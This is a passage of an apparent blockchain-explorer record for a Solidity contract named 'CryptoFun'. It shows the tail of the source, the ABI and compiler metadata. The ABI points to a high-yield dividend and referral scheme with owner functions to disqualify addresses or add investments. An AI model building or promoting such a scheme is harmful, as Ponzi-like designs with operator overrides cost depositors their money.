0;\r\nwaveStartup = now;\r\nm_rgp.startAt(now);\r\nemit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);\r\nemit LogNextWave(now);\r\n}\r\n}","ABI":"[{\u0022constant\u0022:false,\u0022inputs\u0022:[],\u0022name\u0022:\u0022ToDo\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022addrs\u0022,\u0022type\u0022:\u0022address[]\u0022}],\u0022name\u0022:\u0022privateEntranceProvideAccessFor\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022disqualifyAddress\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022advertisingAddress\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022investorAddr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022addInvestment2\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022rev1StorageAddr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022name\u0022:\u0022timestamp\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022init\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022minInvesment\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022adminsAddress\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022investorsNumber\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022maxBalance\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[],\u0022name\u0022:\u0022itisnecessary2\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[{\u0022name\u0022:\u0022investorAddr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022investorDividendsAtNow\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022dividends\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022advertisingPercent\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022numerator\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022denominator\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022adminsPercent\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022numerator\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022denominator\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022setAdminsAddress\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022investmentsNumber\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022dailyPercentAtNow\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022numerator\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022denominator\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022setAdvertisingAddress\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022disqualifyAddress2\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[],\u0022name\u0022:\u0022getMyDividends\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022referrerAddr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022doInvest\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[{\u0022name\u0022:\u0022investorAddr\u0022,\u0022type\u0022:\u0022address\u0022}],\u0022name\u0022:\u0022investorInfo\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022paymentTime\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022name\u0022:\u0022isReferral\u0022,\u0022type\u0022:\u0022bool\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022waveStartup\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022balanceETH\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[],\u0022name\u0022:\u0022doDisown\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022inputs\u0022:[],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022constructor\u0022},{\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022fallback\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022rev1Storage\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022rev2Storage\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022investorMaxInvestment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022endTimestamp\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogPEInit\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022value\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022excess\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogSendExcessOfEther\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:true,\u0022name\u0022:\u0022referrerAddr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022refBonus\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogNewReferral\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022startTimestamp\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022maxDailyTotalInvestment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022activityDays\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogRGPInit\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:true,\u0022name\u0022:\u0022day\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogRGPInvestment\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022value\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogNewInvesment\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022investment\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogAutomaticReinvest\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022dividends\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogPayDividends\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:true,\u0022name\u0022:\u0022addr\u0022,\u0022type\u0022:\u0022address\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogNewInvestor\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022},{\u0022indexed\u0022:false,\u0022name\u0022:\u0022balance\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogBalanceChanged\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogNextWave\u0022,\u0022type\u0022:\u0022event\u0022},{\u0022anonymous\u0022:false,\u0022inputs\u0022:[{\u0022indexed\u0022:false,\u0022name\u0022:\u0022when\u0022,\u0022type\u0022:\u0022uint256\u0022}],\u0022name\u0022:\u0022LogDisown\u0022,\u0022type\u0022:\u0022event\u0022}]","ContractName":"CryptoFun","CompilerVersion":"v0.4.26\u002Bcommit.4563c3fc","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://3e2aab5a7a722a245d70f41dc2c20ce360cc2fc4d0b78f7fb25b2e70af5bfc21"}]